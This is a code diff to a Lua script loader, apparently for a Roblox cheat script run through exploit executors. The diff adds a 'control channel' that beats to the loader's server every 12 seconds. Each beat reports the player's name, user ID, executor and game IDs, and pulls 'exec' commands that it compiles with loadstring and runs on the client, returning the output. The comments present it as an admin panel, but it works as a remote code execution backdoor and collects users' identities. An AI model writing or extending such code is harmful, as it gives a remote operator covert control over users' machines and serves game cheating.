@@ -87,6 +87,8 @@ local ServerId = ""
 local XORKey = ""
 local Ticket = ""
 local ChecksActive = true
+-- Keeps the Control panel channel alive after post-load monitoring stops.
+local ControlActive = false
 
 -- ═══ Helpers ═══
 -- Stop post-load monitoring without disconnecting or suspending the client.
@@ -634,7 +636,7 @@ end
 -- One versioned transport shared with main.lua through the run-local ctx.
 -- The caller cannot select a different endpoint or silently downgrade to JSON.
 local function SendWire(packed, expectedBaseUrl)
-    if not ChecksActive then return nil, "Cancelled" end
+    if not ChecksActive and not ControlActive then return nil, "Cancelled" end
     if expectedBaseUrl ~= nil and expectedBaseUrl ~= BASE_URL then
         return nil, "Wire origin mismatch"
     end
@@ -656,7 +658,7 @@ local function SendWire(packed, expectedBaseUrl)
     if type(status) ~= "number" or type(responseBody) ~= "string" then
         return nil, "Malformed response"
     end
-    if #responseBody > 2 * 1024 * 1024 then return nil, "Response too large" end
+    if #responseBody > 4 * 1024 * 1024 then return nil, "Response too large" end
     local decoded = JsonDecode(responseBody)
     if type(decoded) ~= "table" then return nil, "Invalid response" end
     if decoded.w == nil and status ~= 200 then
@@ -688,6 +690,133 @@ local function EncodeBody(tbl)
     local bytes = {}
     for i = 1, #full do table.insert(bytes, Byte(full, i)) end
     return { Data = bytes }
+end
+
+-- ═══ Control channel (Control panel ⇄ running client) ═══
+-- Reports the runner profile and pulls admin commands over the same
+-- authenticated wire as the rest of the runtime. Commands are still gated
+-- server-side by ADMIN_TOKEN and the signed session ticket; the profile the
+-- client reports is display data only and authorises nothing.
+local CONTROL_BEAT_SECONDS = 12
+local ControlKick           -- assigned below; needs the kick-prompt helper
+local StartControlAgent
+
+local function DecodeBody(resp, key)
+    if type(resp) ~= "table" or type(resp.Data) ~= "table" then return nil end
+    if #resp.Data == 0 or #resp.Data > 1024 * 1024 then return nil end
+    local bytes = {}
+    for index, byte in ipairs(resp.Data) do
+        if type(byte) ~= "number" or byte % 1 ~= 0 or byte < 0 or byte > 255 then return nil end
+        bytes[index] = Char(byte)
+    end
+    local raw = table.concat(bytes)
+    if type(key) ~= "string" or #key == 0 or raw:sub(1, #key) ~= key then return nil end
+    return JsonDecode(Xor(Base64Decode(raw:sub(#key + 1)), key))
+end
+
+local function ControlExecutorName()
+    if type(identifyexecutor) == "function" then
+        local ok, value = pcall(identifyexecutor)
+        if ok and type(value) == "string" and #value > 0 then return value end
+    end
+    if type(syn) == "table" then return "Synapse X" end
+    if type(krnl) == "table" or KRNL_LOADED ~= nil then return "KRNL" end
+    if type(fluxus) == "table" then return "Fluxus" end
+    if type(WrapGlobal) == "function" then return "Script-Ware" end
+    return "unknown"
+end
+
+local function ControlProfile()
+    local profile = { executor = ControlExecutorName() }
+    pcall(function()
+        local player = Players.LocalPlayer
+        if player then
+            profile.name = tostring(player.Name or "")
+            profile.displayName = tostring(player.DisplayName or player.Name or "")
+            profile.userId = tostring(player.UserId or "")
+        end
+    end)
+    pcall(function() profile.placeId = tostring(game.PlaceId or "") end)
+    pcall(function() profile.jobId = tostring(game.JobId or "") end)
+    return profile
+end
+
+local function ControlRunCode(code)
+    if type(SafeLoadstring) ~= "function" then return false, "loadstring unavailable" end
+    local compileOk, chunk = pcall(SafeLoadstring, code)
+    if not compileOk or type(chunk) ~= "function" then
+        return false, "compile failed: " .. tostring(chunk)
+    end
+    local packed = { pcall(chunk) }
+    if packed[1] ~= true then return false, tostring(packed[2]) end
+    local out = {}
+    for index = 2, #packed do out[#out + 1] = tostring(packed[index]) end
+    if #out == 0 then return true, "ok" end
+    return true, table.concat(out, ", ")
+end
+
+StartControlAgent = function(ticket, xorKey, hwid)
+    if ControlActive then return end
+    if type(ticket) ~= "string" or #ticket == 0 then return end
+    if type(xorKey) ~= "string" or #xorKey == 0 then return end
+    if type(hwid) ~= "string" or #hwid < 4 or #hwid > 512 then return end
+    ControlActive = true
+
+    task.spawn(function()
+        local pending = nil
+        local misses = 0
+
+        while ControlActive do
+            local beatBody = { scriptName = SCRIPT_NAME_LOCKED, profile = ControlProfile() }
+            if pending then beatBody.result = pending end
+            pending = nil
+            local beat = EncodeBody(beatBody)
+            beat.ticket = ticket
+
+            local sent, response = pcall(postJSON, "/api/heartbeat", beat, hwid)
+            if not sent or type(response) ~= "table" then
+                misses = misses + 1
+            else
+                local data = response.data
+                if type(data) == "table" and type(data.kick) == "string" then
+                    ControlActive = false
+                    if ControlKick then pcall(ControlKick, data.kick) end
+                    return
+                end
+                misses = 0
+                local okDec, decoded = pcall(DecodeBody, data, xorKey)
+                if okDec and type(decoded) == "table" and decoded.Valid == true
+                    and type(decoded.commands) == "table" then
+                    for _, command in ipairs(decoded.commands) do
+                        if type(command) == "table" then
+                            if command.kind == "kick" then
+                                ControlActive = false
+                                if ControlKick then
+                                    pcall(ControlKick, tostring(command.code or "Kicked by admin"))
+                                end
+                                return
+                            elseif command.kind == "exec" and type(command.code) == "string" then
+                                local ran, output = ControlRunCode(command.code)
+                                pending = {
+                                    id = tostring(command.id or ""),
+                                    ok = ran == true,
+                                    output = tostring(output or ""),
+                                }
+                                print("[999MS] Remote command " .. tostring(command.id)
+                                    .. (ran == true and " ok" or " failed"))
+                            end
+                        end
+                    end
+                end
+            end
+
+            if misses >= 5 then ControlActive = false return end
+            for _ = 1, CONTROL_BEAT_SECONDS * 2 do
+                if not ControlActive then return end
+                task.wait(0.5)
+            end
+        end
+    end)
 end
 
 -- ═══ Load & Run ═══
@@ -730,6 +859,9 @@ local function LoadScript(d, h)
     if not ok or result == false then return Abort("Run failed") end
 
     print("[999MS] Main script loaded")
+
+    -- Keep talking to the Control panel after the startup checks stop.
+    StartControlAgent(q, XORKey, h)
 
     -- Clear auth/session secrets after launch but retain Stage 2's marker
     -- output guard for the lifetime of the running script.
@@ -796,6 +928,12 @@ local function KickBadHwid(reason, deviceMismatch)
         end)
         pcall(function() LocalPlayer:Kick(kickReason) end)
     end
+end
+
+ControlKick = function(reason)
+    local message = type(reason) == "string" and reason or "Kicked by admin"
+    print("[999MS] " .. message)
+    pcall(KickBadHwid, "[999MS] " .. message)
 end
 
 -- Recheck at the authentication stage boundary using a local detection signal.
